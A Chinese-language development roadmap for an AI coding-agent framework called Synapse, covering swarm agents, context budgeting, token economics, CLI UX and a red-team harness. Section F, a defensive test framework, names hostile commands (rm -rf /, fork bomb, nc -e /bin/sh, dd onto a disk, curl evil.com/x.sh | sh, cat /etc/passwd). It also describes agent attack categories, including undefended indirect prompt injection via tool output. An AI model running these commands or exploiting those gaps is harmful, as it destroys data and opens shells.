# Synapse 待办与拓展规划

> 后续可通过读取本文件讨论和推进任意功能点。暂时不做的需求也记录在此，避免遗忘。
> **规则**：完成后在标题旁标注 `✅ 已完成 (YYYY-MM-DD)`，保留原文不删除。

---

## 拓展方向

### A · MCP 协议支持

**状态**：✅ 已完成 (2026-07-16)

当前工具是硬编码的 10 个。MCP（Model Context Protocol）是 Anthropic 推出的标准化工具协议，支持动态发现和调用任意 MCP Server 提供的工具。

**要点**：
- 实现 MCP Client 协议（stdio + SSE transport）
- 动态 ToolSchema 生成与注册
- 工具生态从"内置"变为"无限可扩展"

**难度**：中等

---

### B · 过程质量验证闭环

**状态**：✅ 已完成 (2026-07-24)

当前 ProcessMetrics 采集了指标但缺少自动验证——即在任务完成后自动检查 Agent 行为质量，并反馈给 Agent 以改进下次执行。

**要点**：
- 对工具调用序列做模式识别（"先 grep 再 write"=复用，"直接 write"=未复用）
- 任务完成后生成过程质量评分
- 设计反馈机制（prompt 中注入质量提示或记忆系统记录）

**实现（2026-07-24）**：新增 `synapse/modules/process_quality.py` 的 `ProcessQualityVerifier`，订阅 `tool_call_*` 事件捕获有序工具序列；任务结束（`Agent.run` 后处理钩子）时按"写/改前是否有 read/grep/glob 命中同文件"判定复用率，与成功与否加权得 0~1 过程质量分，发出 `process_quality_scored` 事件，并把滚动反馈条目写入 PROJECT 记忆。检索器 `_build_reference` 用固定查询把该反馈注入下一任务的 reference 上下文→进入 system prompt，形成闭环。详见 `DEVELOPMENT.md`。

**难度**：较高

---

### C · 多 Agent 协作（Swarm/Team）

**状态**：✅ 已完成 (2026-07-24)

当前只有单 Agent + HierarchicalPlanner 的树形分解。真正的多 Agent 协作是多个对等 Agent 同时工作、互相 review、投票决策。

**要点**：
- Agent 间通信协议
- 冲突解决与结果合并
- 专用 Agent（Code Reviewer、Test Writer、Security Auditor）
- 并行 Agent 的错误放大问题需要专门的验证 Agent 来抵消

**实现（2026-07-24）· 核心闭环 MVP**：新增 `synapse/modules/planning/swarm.py` 的 `SwarmPlanner`，做"对等并行 + 验证闭环"的最小可用闭环：

- **角色即差异**：worker 就是普通 `ReActPlanner`，仅靠 `RoleSpec(role, system_prompt_suffix, tool_filter, count, file_scope)` 区分——无需新建 Reviewer/Tester 类。新增角色只需加一个 `RoleSpec`。
- **默认团队**：2 个并行 coder（`file_scope=True`）+ 1 个只读 reviewer（`tool_filter={"read","grep","glob","git"}`）。
- **并行与隔离**：多 coder 时由 LLM 拆成互不重叠的文件作用域（`_decompose_scopes`，解析失败优雅回退为 n 份复制）；每个 worker 用 `session.fork(agent_id)` 拿到隔离子会话；coder 用 `asyncio.gather` 真正并行，reviewer 等合并后再审。
- **结果合并**：复用 `HierarchicalPlanner` 的 `merge_subtask_results`（同一套"合成子结果"prompt，不重复造轮子）。
- **验证闭环**：reviewer 审合并结果，结论由 `_judge` 从输出文本映射为 approve/reject；reject 则重跑最弱 coder（fork 重试会话、带上审查意见），重新合并再审，最多 `max_verify_loops` 次。这刻意反转了 Hierarchical 的"串行以抑制错误放大"——用验证闭环来抵消并行的风险。
- **只读隔离**：`FilteredToolRegistry` 同时过滤 `get`（执行）与 `get_schemas`（暴露给 LLM 的 schema），让只读角色无法被模型说服去调用写工具。
- **事件**：新增 `WorkerSpawned / WorkerCompleted / ReviewSubmitted / VoteCast / SwarmVerified` 五个事件（`protocols/events.py`），`BaseEvent` 增加 `agent_id`/`role` 字段；`AgentResult` 增加 `agent_id`/`role`/`contributors`。
- **接入**：`PlanningMode.SWARM` 已注册到 `adapters/library.py` 与 `adapters/cli.py`，`ReActPlanner` 支持 `role`/`system_prompt_suffix` 注入。
- **测试**：`tests/modules/test_swarm_planner.py`（4 项：happy-path 通过 / coder 真正并行 / reject 后验证闭环重跑 / 工具过滤）。

**ponytail 已知上限**：MVP 不在沙箱层硬隔离文件作用域，依赖分解质量；升级路径是把 `file_scope` 作为写白名单传给 sandbox/workspace。

**难度**：高

---

### D · IDE 插件 / LSP 集成

**状态**：待实现

将 Synapse 从终端工具变为 IDE 中的 AI 搭档。通过 LSP 获取精确的符号信息和诊断信息。

**要点**：
- VS Code / JetBrains 插件
- Language Server Protocol 集成（符号索引、诊断、引用跳转）
- 选中代码直接交互（解释、修复、重构、生成测试）

**难度**：中等（VS Code 插件）/ 低（LSP 集成）

---

### E · 上下文工程深度优化

**状态**：✅ 已完成 (2026-07-20)

当前 Partitioner + Compactor 是 Phase 1 级别的简单实现（截断）。调研显示 token 浪费率极高（154:1 输入输出比）。

**调研发现的关键问题**：
1. planner 只消费 `context.system`，`core/reference/overflow` 完全被忽略 — 所有优化对 LLM 不可见
2. `ContextCompactor` 注册了但从未调用 — OVERFLOW 永不压缩
3. budget 硬编码 `ContextBudget()` 100k，与 `PlanningConfig.max_tokens_per_task=200k` 脱钩
4. 5s 超时返回空 Context，无回退 — 大项目首跑直接丢上下文
5. Compactor 截断 500 字符 + 覆盖 source 为 MEMORY — 丢失 provenance
6. Retriever 只 grep+glob + SESSION memory — 没用 AST/git/PROJECT/USER 记忆
7. `ContextBlock` 缺 id/usage/citation/relevance 字段 — 无法做引用率统计
8. Partitioner `_trim_zone` 有 break bug — 小预算下误丢本可放下的块

---

#### Phase 0 · 前置修复（地基，必做）

**目标**：让四区真正流到 LLM，让 compactor 真正运行，让 budget 跟随配置。

**0.1 planner 接入四区**（`react.py`, `plan_execute.py`）
- `_build_system_prompt` 不只拼 `context.system`，按 `system → core → reference` 顺序注入
- 每个 block 带 source 标注（如 `[from grep]`/`[from memory]`），overflow 不注入
- token 预算检查：注入前预估总 token，超出则在 reference 区按 priority 降序裁剪

**0.2 Agent 调用 Compactor**（`agent.py:_build_context`）
- 流程改为：`retrieve → compact(overflow) → partition → inject`
- 调用点放在 partitioner 前，让 compactor 先压缩 overflow，partitioner 再做四区裁剪

**0.3 Budget 配置化**（`schema.py`, `agent.py`）
- 新增 `ContextConfig`（在 `SynapseConfig.context`）：`total_tokens`（默认从 `planning.max_tokens_per_task` 取）、`system_pct`/`core_pct`/`reference_pct`/`overflow_pct`、`compaction_strategy`（`truncation` | `llm` | `off`，默认 `truncation`）
- `Agent._build_context` 从 config 取 budget，不再硬编码

**0.4 修 partitioner break bug**（`partitioner.py`）
- `_trim_zone` 改为 knapsack 式保留：按 priority 降序排，能放就放，放不下也尝试后续更小的块

**0.5 超时回退**（`agent.py`）
- 5s 超时改为：返回只含 SYSTEM 的最小 Context（读 README/AGENTS.md），打 `AgentProgress` 警告事件，不静默丢

**0.6 保留 provenance**（`compactor.py` + `retriever.py`）
- 压缩后生成新 block，新增 `derived_from` 字段记录原 block id，不覆盖 source
- `ContextBlock` 加 `id` 和 `derived_from` 字段

---

#### Phase 1 · LLM 驱动智能摘要

**目标**：Compactor 用 LLM 摘要替代截断。

**1.1 新增 `LLMCompactor`**（`synapse/modules/context/llm_compactor.py`）
- 实现 `ContextCompactor` 协议
- 对每个 overflow block 调用 LLM，prompt："Summarize the following for a coding task, preserve file paths/symbols/key findings: {content}"
- 缓存：相同 content hash 不重复调用
- 失败回退：LLM 调用失败 → 降级到 `TruncationCompactor`

**1.2 配置开关**
- `ContextConfig.compaction_strategy = "llm"` 时启用，默认仍 `truncation`
- 触发阈值：仅当 overflow 总量 > N 字符时才触发 LLM 摘要，否则截断即可

**Trade-off**：摘要质量 vs token 成本 — LLM 摘要每次任务多花 500-2k token，但能让 overflow 真正有用。

---

#### Phase 2 · 引用率追踪（RAG 评估基础）

**目标**：标注每个 ContextBlock 的实际引用率，为 Phase 3 动态预算提供数据。

**2.1 ContextBlock 加字段**（`retriever.py`）
- `id: str` — uuid hex 前 8 位，唯一标识
- `usage_count: int` — 该 block 被发送给 LLM 的次数（每次 LLM 调用 +1）
- `citation_count: int` — LLM 输出中明确引用该 block 内容的次数
- `retrieved_at: datetime` — 该 block 被检索的时间戳

**2.2 CitationTracker**（`synapse/modules/context/citation.py`）
- `mark_usage(context)` — 在 planner 把 context 发给 LLM 前调用，递增每个 block 的 `usage_count`
- `track_response(response_content, context, event_bus, session_id)` — LLM 响应后扫描内容：
  - 从每个 block 提取"信号"（文件路径、`def/class` 符号名、≥12 字符的特征行）
  - 信号在 response 中出现 → 递增 `citation_count`，发 `ContextBlockCited` 事件
  - 每个 block 最多测试 5 个信号，避免性能开销
  - 偏好精确而非召回：只计强信号，citation_count 是下界

**2.3 ContextBlockCited 事件**（`events.py`）
- 新增 `EventType.CONTEXT_BLOCK_CITED = "context_block_cited"`
- 事件载荷：`block_id`、`block_source`、`response_snippet`（响应前 200 字符）

**2.4 `/memory` 命令展示引用率**（`cli.py`）
- 在原有 messages/tokens/provider/workspace 信息后，追加每个 zone 的 citation 汇总
- 显示格式：`Context: system 2/3 cited · core 1/5 cited · reference 0/2 cited`

**Trade-off**：字符串匹配不精确 — 但比完全不追踪强 100 倍。后续可升级为 embedding 相似度。

---

#### Phase 3 · 动态预算分配

**目标**：根据任务类型自动调整四区比例，让上下文分配匹配任务需求。

**3.1 任务类型分类器**（`synapse/modules/context/classifier.py`）
- 输出 `TaskType` enum：`TEST / REFACTOR / DEBUG / FEATURE / DOC / UNKNOWN`
- 规则分类（先于 LLM，避免 token 成本），首匹配优先，顺序 DEBUG → TEST → REFACTOR → DOC → FEATURE：
  - 包含 "debug"/"fix"/"bug"/"error"/"修复"/"调试" → DEBUG
  - 包含 "test"/"测试"/"spec"/"pytest" → TEST
  - 包含 "refactor"/"重构"/"rename" → REFACTOR
  - 包含 "doc"/"readme"/"文档" → DOC
  - 包含 "add"/"implement"/"新增"/"实现" → FEATURE
  - 其余 → UNKNOWN（用默认 profile）
- DEBUG 排在 TEST 前：`fix failing test` 应判为 DEBUG（在调试失败用例，而非编写新测试）

**3.2 预算策略表**（`synapse/modules/context/budget.py`）
- `TASK_BUDGET_PROFILES: dict[TaskType, ContextBudget]`
  - TEST:     system=0.10, core=0.40, reference=0.40, overflow=0.10（测试需要大量参考）
  - REFACTOR: system=0.15, core=0.60, reference=0.20, overflow=0.05（重构以核心代码为主）
  - DEBUG:    system=0.10, core=0.30, reference=0.50, overflow=0.10（调试需大量参考定位）
  - FEATURE:  system=0.15, core=0.50, reference=0.25, overflow=0.10（默认）
  - DOC:      system=0.20, core=0.30, reference=0.40, overflow=0.10（文档需参考既有内容）
  - UNKNOWN:  同 FEATURE
- `select_budget(task_type, base_cfg)` — 根据任务类型选 profile，`total_tokens` 始终从 `ContextConfig.total_tokens` 或 `planning.max_tokens_per_task` 继承

**3.3 Agent 接入分类器**（`agent.py:_build_budget`）
- `_build_budget(task: str)` — 先分类任务类型，再选 profile
- 保留 `ContextConfig` 的百分比作为 UNKNOWN 的回退

**3.4 历史反馈**（`synapse/modules/context/budget.py` + `ProjectMemory`）
- `BudgetHistory` 类：
  - `record(task_type, citation_report)` — 任务结束后记录该类型的引用率汇总
  - `load(task_type)` — 加载该类型的历史引用率
  - `suggest_adjustment(task_type, base_profile)` — 根据历史引用率微调 profile
    - 如：TEST 类型历史显示 reference 引用率 80%、core 引用率 10% → 建议 reference +5%、core -5%
  - 持久化到 `ProjectMemory`（key: `budget_history_{task_type}`），跨会话保留
- 冷启动：前 N 次（默认 3）任务用默认 profile，积累数据后启用自适应

**Trade-off**：
- 规则分类粗糙 — 但 LLM 分类又多花 token。先用规则，验证有效再考虑 LLM 分类
- 历史反馈有冷启动问题 — 用计数器控制，前 N 次用默认 profile

---

#### Phase 4 · 注意力热力图

**目标**：更细粒度的上下文使用分析，让用户/开发者直观看到哪些 context block 真正被 LLM 使用。

**4.1 CitationTracker 核心实现**（`synapse/modules/context/citation.py`，Phase 2 已实施）
- `mark_usage(context)` — 递增 `usage_count`
- `track_response(response_content, context, event_bus, session_id)` — 信号匹配 + 发事件
- `_extract_signals(block)` — 提取文件路径、符号名、特征行（每 block 最多 5 个信号）
- `report(context)` — 返回 per-block 报告 dict，包含 zone/source/priority/tokens/usage/cited/citation_rate

**4.2 信号提取策略**（`_extract_signals`）
- 文件路径正则 `[\w./\\-]+\.\w{1,6}` + 必须含 `/` 或 `\`（过滤噪声如 `v1.0`）
- `def/class/function` 后的符号名
- ≥12 字符的非注释行（跳过 `#` 开头和常见 markdown 标记）
- 去重 + 限 5 个信号/block

**4.3 Agent 保留上下文**（`agent.py`）
- `self._last_context = context` — 保留最后一次 build 的 context
- `self._citation_tracker = planner._last_citation_tracker` — 拿到 planner 创建的 tracker
- `Synapse` facade 保留 `self._last_agent`，暴露 `get_citation_report()` 方法

**4.4 `/context-report` 命令**（`cli.py`）
- 新增 `_show_context_report(console, synapse, use_rich)` 函数
- Rich 表格显示：Zone / Source / Pri / Tokens / Used / Cited / Rate
- Rate 列用绿色显示 `cited/used` 比例
- 末尾汇总：`Overall: X/Y blocks cited`

**4.5 补全与帮助**（`cli.py`）
- `_SLASH_COMMANDS` 加入 `/context-report`（描述 "Context block citation heatmap"）
- `_show_help` 表格加入 `/context-report` 行

**Trade-off**：
- 跨 provider 兼容性差 — 只有 Anthropic 暴露 cache 元数据，但字符串匹配对所有 provider 通用
- 字符串匹配不精确 — 偏好精确而非召回，citation_count 是下界
- 性能开销小 — 每次 LLM 响应后做一次扫描，每 block 最多 5 个信号
- 后续可升级为 embedding 相似度，但当前实现已能覆盖 80% 的"上下文使用"分析需求

---

#### 实施顺序与依赖

```
Phase 0 (前置修复) ─┐
                    ├─→ Phase 1 (LLM 摘要) ─┐
                    │                        ├─→ Phase 3 (动态预算)
                    └─→ Phase 4 (热力图) ────┘
                       (Phase 2 并入 Phase 4)
```

**本次会话范围**：Phase 0 + Phase 1 + Phase 4（用户确认）。Phase 2/3 后续会话推进。

**不做的事**：
- 替换 Retriever 为 AST/语义检索（超出 TODO E 范围）
- 自研 tokenizer（继续用 `len//4` 估算）
- LLM 分类任务类型（先用规则，验证有效再考虑）

**风险**：
- planner 接入四区后 prompt 变长，可能触发 thrashing — 通过 token 预算检查控制
- LLM Compactor 增加任务耗时和成本 — 通过配置开关 + 触发阈值控制，默认关闭

**ponytail 已知上限（2026-07-24 复审）**：
- Retriever 实际只填充 `system/core/reference`，**从不填充 `overflow`**，导致 `ContextCompactor` / `LLMCompactor`（Phase 0/1）在真实 `Agent.run` 路径中永远不被触发——四区压缩当前是"已接线但未运行"。**已修复（2026-07-24，方案 A）**：`BasicContextRetriever._route_overflow` 把超出 reference 预算的结果路由进 `overflow`；`Agent._build_context` 压缩后把摘要折回 `reference`（因 `react.py` 不直接注入 overflow 区），使压缩结果真正被 LLM 消费。`tests/modules/test_context_phase_e.py` 的 `TestOverflowRouting` 覆盖该路径。
- `BudgetHistory` 自适应反馈原为"只写"——`record()` 持久化到 `ProjectMemory` 但 `_load()` 从不读回，跨会话无法自适应。**已修复（2026-07-24）**：`_load()` 改为 async 并从 `ProjectMemory` 取回"样本数最多"的累计快照作为基准（不累加、不重复计数）；`suggest_adjustment` 相应改为 async；`tests/modules/test_context_phase_2_3.py::test_history_persists_across_instances` 覆盖跨实例读回。

---

### F · 安全红队 / 对抗测试框架

**状态**：✅ 已完成 (2026-07-24)

首版落地**确定性、CI 可跑、可复现**的红队框架：系统性攻击库 + 自动化安全评分。不接真实 LLM（脚本化 LLM 重放预设攻击步骤），不加固已知弱点（仅诚实暴露并报告，留给后续加固会话）。

**调研关键发现**：`SafetyMetrics`（`eval/metrics/safety.py`）订阅了 `auth_decision` / `file_written` 事件来统计 `auth_blocks` / `out_of_workspace_access`，但 `react.py` 从未发射 `AuthDecisionMade` / `file_write.py` 从未发射 `FileWritten` —— 这俩指标长期恒为 0，评分器是"瞎的"。首版**顺带修复**了该发射缺口（`react.py` 在授权判断后始终发射 `AuthDecisionMade`、写成功发射 `FileWritten`），让评分真正有信号，且不动 Tool 协议。

**要点 / 实现**：
- **攻击库**（`eval/redteam/attacks.py`）：`AttackCategory`（直接/间接/多步/沙箱逃逸/权限提升）+ `DefenseOutcome`（BLOCKED/ALLOWED）+ `AttackStep`（工具调用或纯文本）。`seed_attacks()` 提供 ~19 个种子案例 —— ~16 个"硬化"用例（预期 BLOCKED，被 `ActionAuthorizer` 硬拒路径中和：`rm -rf /`、fork bomb、`:(){ :|:& };:`、`nc -e /bin/sh`、`dd if=/dev/zero of=/dev/sda`、`mkfs.ext4`、间接/注入变体 via read+shell、多步、沙箱逃逸、权限提升 `chown -R` 等）+ 3 个 `known_gap=True` 诚实软点（只跑**无害**命令：`cat /etc/passwd` via allow-listed cat、`curl evil.com/x.sh | sh` via allow-listed curl 管道、写 `/tmp/backdoor.txt` 越出 workspace 且无 confirm 回调）。
- **确定性驱动 harness**（`eval/redteam/runner.py`）：`AttackLLM` 按 `AttackCase.steps` 重放（有 `tool` 则作为工具调用、无则作为结束文本；无 `stream` 方法 → react.py 回退到 `chat()`）。`RedTeamRunner` 订阅 `auth_decision` 事件，对每个攻击：`actual = BLOCKED if 任何拒绝 else ALLOWED`，`passed = actual == expected_defense`，`findings` 收集未通过项。
- **测试**（`tests/eval/test_redteam.py`，3 项全过）：种子库端到端（`_NullRetriever` + 真实 Container/Tools/ProcessSandbox/ActionAuthorizer/ReActPlanner，跑通 `Agent.run` 全链路）、`AttackLLM` 重放单测、`RedTeamRunner` 聚合评分单测。全链路断言：硬化→BLOCKED 且通过、软点→ALLOWED 且未通过且在 findings、`auth_blocks > 0`、pass_rate ∈ [0,1]。

**已知上限（ponytail，诚实暴露）**：
- `InjectionGuard` 只标注上下文块、**不检查工具输出** → 间接注入未防御（归类为 `known_gap` 而非顺带修复）。
- 种子库规模 ~19（首版核心集），非 88+ 全量变种；结构已支持增量扩充。

**难度**：中等

---

### G · Token 经济性优化

**状态**：✅ 已完成 (2026-07-19)

调研显示 token 投入与产出弱相关（Kendall tau = 0.32），最高准确率出现在低消耗区间。

**要点**：
- 智能 early-stop（检测 thrashing 或低效循环时终止）
- Prompt 缓存策略（跨任务共享 system prompt 和上下文）
- 模型路由（简单任务用小模型，复杂任务用大模型）
- 成本预估与预算控制

**难度**：中等

---

## 暂时不做 / 低优先级

_（暂无。后续如有暂不推进的需求，记录在此。）_

---

*最后更新：2026-07-24*
---

### H · CLI 主界面（Rich 增强型 REPL）

**状态**：✅ 已完成 (2026-07-24)

输入 `synapse`（无子命令）进入增强型交互主界面，类似 Claude Code / pico。

**方案选定**：Rich 增强型 REPL（欢迎横幅 + 项目信息 + `/` 命令系统 + 状态行）

**要点**：
- `synapse` 无参数直接进入主界面
- 欢迎横幅显示版本/provider/model/项目路径/工具数
- `/` 命令：`/help` `/memory` `/session` `/reset` `/clear` `/model` `/provider` `/mode` `/tools` `/context-report` `/exit` `/quit`
- 现有子命令（chat/run/serve/eval/experiment）保持不变
- 用 Rich Panel/Table 美化输出

**难度**：低（复用现有 Rich 依赖）

---

### I · Swarm 文件作用域硬隔离

**状态**：已实现（2026-07-24）

TODO C 的 Swarm 默认团队（2 并行 coder + 1 只读 reviewer）依赖 LLM 拆分的文件作用域。原先 `file_scope` 仅作为分解提示传给 prompt、未强制；现已在授权层硬隔离：

- `ActionAuthorizer` 新增 `allowed_paths` 写白名单参数，在 `WRITE_LOCAL` 分支最前对越界写**硬拒**（`allowed=False`）——同时覆盖 `write` 与 `edit` 两类工具（二者 `risk_level` 均为 `WRITE_LOCAL`，统一走 `react.py` 的 `authorize` 调用）。
- `SwarmPlanner._decompose_scopes` 生成的 `file_scope` 现透传至每个 coder worker：经 `_spawn` → worker dict → `_make_planner` 为各 coder 构造 **per-worker** `ActionAuthorizer(allowed_paths=[scope])`，替换原先共享的单例；`file_scope=""`（单 coder / LLM 回退）时沿用共享 auth，行为不变。
- 文件型 scope（如 `src/a.py`）按启发式归一化为其所在目录边界；`ponytail:` 注释已记录该上限与升级路径（更细的文件级粒度）。

**要点对照**：
- 写白名单 → `ActionAuthorizer.allowed_paths`（非 `ProcessSandbox`，因写文件绕过了 sandbox 直接落盘）
- worker 越界写 → 授权层硬拒（复用 `ActionAuthorizer` 路径，非 out-of-workspace 那条）
- 与 `--mode swarm` / `/mode swarm` 入口无缝衔接（swarm.py 内部改动，入口不变）

**测试**：`tests/modules/test_auth.py`（`test_scoped_write_inside_scope_allowed` / `test_scoped_write_outside_scope_denied` / `test_scoped_edit_outside_scope_denied` / `test_scope_as_file_path_allows_containing_dir` / `test_no_scope_unchanged`）、`tests/modules/test_swarm_planner.py`（`test_spawn_stores_file_scope` / `test_coder_file_scope_threaded_to_per_worker_auth`）。

**难度**：中等（已落地）

---

### J · 红队攻击库扩充 + 真 LLM 对抗

**状态**：待实现

TODO F 落地了确定性的种子库（~19 案例）+ 脚本化 `AttackLLM` 重放。升级路径：扩到更多变种（TODO F 原计划的 88+ 变种），并加"用真实 LLM 跑攻防"的 CLI harness——让红队能接真实模型做开放式对抗，而非仅重放预设步骤。

**要点**：
- 攻击库从 ~19 扩充（直接/间接/多步/沙箱逃逸/权限提升 更多变种）
- 新增真 LLM 驱动的对抗模式（复用 `RedTeamRunner`，替换 `AttackLLM` 为真实 provider）
- `AttackLLM` 重放路径保留，作为 CI 可跑的确定性回归集

**难度**：中等

---

### K · 运行时评分闭环

**状态**：已实现（2026-07-24）

4 个 eval 收集器（`ProcessMetrics` / `QualityMetrics` / `EfficiencyMetrics` / `SafetyMetrics`）原先仅在 `_enable_eval` 时接线，真实运行不产生评分。现已闭环：

- `library._build_container` 把 4 个收集器**统一改为始终实例化并订阅 EventBus**（移除 eval 门控，它们只是轻量计数器），存入 `self._run_metrics` 并注册到 container。
- `Library.run()` 每次任务前 `reset()` 4 个收集器（独立计分），运行后构造 `RunScore`（task/status + 4 快照），存 `self._last_run_score`，并 `_persist_run_score` 落 `ProjectMemory`（滚动日志 `run-score-log.md`，`try/except` 兜底不阻塞主流程）。
- 新增 `get_run_score()` 暴露评分（报告路径，总可调用）；`RunScore` 数据类在 `synapse/eval/metrics/__init__.py`，含 `to_dict()`。
- 与 TODO B 的"评分驱动下一次执行"未打通（TODO B 尚未实现），本项仅完成"产出 + 可观测 + 落记忆"闭环。

**测试**：`tests/adapters/test_library_api.py`（`test_run_score_populated_after_run` / `test_run_metrics_wired_and_collect`）。

**难度**：中等（已落地）

---

### L · 使用体验（UX）优化

**状态**：进行中（2026-07-24 起，逐子项实现）

项目有 CLI / HTTP server / 库 API 三种用法，但可观测性严重不均：REPL 主界面（流式 + Rich live 面板）较完善，而 `run` 子命令、server、`get_run_score()`（TODO K）与 Swarm 并行过程对用户几乎不可见。以下 5 个子项均复用现有基建（REPL 的 `_LiveDisplay`、EventBus 事件、`get_run_score`/`get_citation_report`），属"接线"而非新建。

#### L.1 · `run` 子命令 / server 补齐流式与进度
**状态**：✅ 已实现（2026-07-24）
- **要点**：把 REPL 已成熟的 `_LiveDisplay` 事件订阅面板复用到 `run` 子命令；server 的 `POST /run` 增加 SSE 流式。
- **现状痛点**：`cli.py:503` 打印 `Working...` 后阻塞、无异常兜底（抛原始 traceback）；`server.py:154` 阻塞返回最终 JSON，过程全黑盒。
- **实现**：抽出复用型异步 helper `_run_task_streamed()`（`cli.py`），`run` 子命令改用 Rich live 面板订阅 `agent_progress/llm_token/tool_call_started/tool_call_completed`，带友好异常兜底（不抛原始 traceback）；server 新增 `POST /run/stream` SSE 端点，推送过程事件 + `done/error` 终态。测试 `tests/adapters/test_cli_run.py`（2 项）+ `tests/adapters/test_server.py::test_run_task_stream`（1 项）。REPL 主界面未改动（已流式，避免回归）。
- **难度**：中（CLI 复用面板较易；server SSE 需加流式响应）

#### L.2 · Swarm 过程可视化
**状态**：✅ 已实现（2026-07-24）
- **要点**：CLI 订阅 `WorkerSpawned/ReviewSubmitted/VoteCast/SwarmVerified` 等事件，在 live panel 展示"几个 worker、谁被 reject、重试几次、是否 verified"；server 用 SSE 推送。
- **现状痛点**：`events.py:162-206` 已 emit 这些事件，但 CLI 只订阅 4 类基础事件，Swarm 并行/review/验证循环对用户全黑盒。
- **实现**：新增 `_SwarmTracker`（维护 `workers/reviews/votes/verified` 状态并渲染紧凑行），`run` 子命令（`_run_task_streamed`）与 REPL 主界面各 `wire()` 5 个 swarm 事件，经 `_LiveDisplay.set_swarm_lines()` 在面板底部青色区展示；server `_run/stream` 的 `_STREAM_EVENTS` 纳入 5 个 swarm 事件且 `_on_event` 改为通用事件字段转储（含 `timestamp` 序列化）。测试 `test_cli_run.py::test_swarm_tracker_renders_lifecycle` + `test_server.py::test_run_task_stream_includes_swarm_events`。`chat` 子命令为瞬时状态条，未接入（避免刷屏）。
- **难度**：中

#### L.3 · 确认提示补风险 + 修复非交互语义
**状态**：✅ 已实现（2026-07-24）
- **要点**：确认回调给出将要写入的文件路径 / 执行的命令 / risk 等级；修复 `react.py` 与 `auth.py` docstring「非交互=auto-denied」声明不符（实际是无 callback 时静默放行）；修 swarm 并发确认抢 stdin。
- **现状痛点**：`cli.py` 确认提示仅显示工具名；非交互/server 模式下写/执行工具被静默放行（安全+UX 双坑）。
- **实现**：
  - 语义对齐（用户选定「自动拒绝」）：`react.py` 中 `requires_confirmation` 且无确认回调 → 一律硬拒，绝不静默执行（修复前会 fall-through 直接执行）。`auth.py` docstring 同步改为「非交互无回调=自动拒绝，需调用方显式传确认回调才能批准」。
  - 头less 放行入口：`run` 子命令新增 `--yes/-y`（传 auto-approve 回调）；`server` 的 `RunRequest` 新增 `auto_approve: bool`，`/run` 与 `/run/stream` 透传给 `synapse.run(confirm_callback=...)`。`Synapse.run()` 支持 per-run `confirm_callback`（重建该次 planner 并事后还原，`ponytail:` 注明并发请求下为已知上限）。
  - 确认提示增强：`_make_confirm_callback` 的 `_describe()` 展示 `tool [risk] → path/command`；并加 `asyncio.Lock` 串行化并发 worker 的 stdin 提示（`base._confirm` 为 worker 共享实例，`y` 跨 worker 置位属预期 session 级行为）。
  - 测试：`test_auth_confirm_flow.py::test_no_confirm_callback_auto_denies`（无回调自动拒绝、文件不落盘）、原 deny 链路测试保持通过；`react.py` 改为 `denied_result` 标志位写法消除 `continue` 在 try 内的作用域诡异（原先偶发 `UnboundLocalError`）。
- **难度**：中（含语义对齐，需先定「无 callback 时硬拒还是硬放」）

#### L.4 · 暴露运行时评分与过程质量 hint
- **状态**：✅ 已实现（2026-07-24）
- **要点**：加 `/score` 斜杠命令（CLI）与 server `/run` 响应字段，展示 TODO K 的 `RunScore`（safety/process/quality/efficiency）；把 `ProcessQualityScored.hint` 也展示给用户。
- **现状痛点**：`library.get_run_score()` 每 run 计算并落 ProjectMemory，但 CLI 无命令、server 无字段，完全不可见。
- **实现**：
  - 评分闭环可视化：`library.py` 在 `_build_container` 中订阅 `process_quality_scored` 事件到 `_on_process_quality_scored`，把最新 `hint` 存 `self._last_process_hint`；`run()` 每次开头清空该 hint，`get_run_score()` 输出 dict 末位新增 `process_hint` 键（与四个快照一并序列化）。
  - CLI：`/score` 斜杠命令（`_show_score` helper）渲染 safety/process/quality/efficiency 四组指标 + hint，并加入 `/help` 帮助表。
  - server：`RunResponse` 新增 `run_score: dict | None`，`/run` 与 `/run/stream` 的 `done` 事件均透传 `synapse.get_run_score()`。
  - 测试：`test_library_api.py::test_run_score_includes_process_hint`（订阅捕获 hint + run 后闭环重捕获）、`test_run_score_populated_after_run` 扩键集含 `process_hint`；`test_server.py::test_run_task_includes_run_score`（/run 返回 run_score）及 stream/mock 同步修正。
- **难度**：低（接线为主）

#### L.5 · 统一友好错误反馈
- **要点**：`run` 子命令加异常兜底（不再抛原始 traceback）；把 `SynapseError` 子类（`core/exceptions.py`）转成「原因 + 建议动作（查 API key / 网络 / 放宽 scope）」；授权拒绝 / 危险命令说清命中哪条 pattern。
- **现状痛点**：`run` 子命令无异常兜底；REPL 仅打印 `类型: 消息`；授权/危险命令原因晦涩，异常层次未被转译为面向用户文案。
- **难度**：低

---

*最后更新：2026-07-24*
